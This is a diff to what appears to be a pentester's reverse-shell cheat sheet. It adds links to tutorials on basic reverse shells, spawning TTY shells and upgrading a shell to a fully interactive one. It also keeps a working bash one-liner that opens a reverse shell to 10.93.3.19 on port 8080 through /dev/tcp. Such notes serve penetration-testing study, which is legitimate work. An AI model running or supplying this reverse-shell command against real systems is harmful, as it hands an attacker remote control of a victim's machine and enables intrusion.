@@ -1,4 +1,13 @@
 
+## Basic Shells
+https://metahackers.pro/reverse-shells-101/
+
+## tty shell
+https://www.metahackers.pro/spawing-tty-shells/
+
+## Create Full interactive shell (Cntrl^C)
+https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/
+
 # Bash
 - bash -i >& /dev/tcp/10.93.3.19/8080 0>&1
 
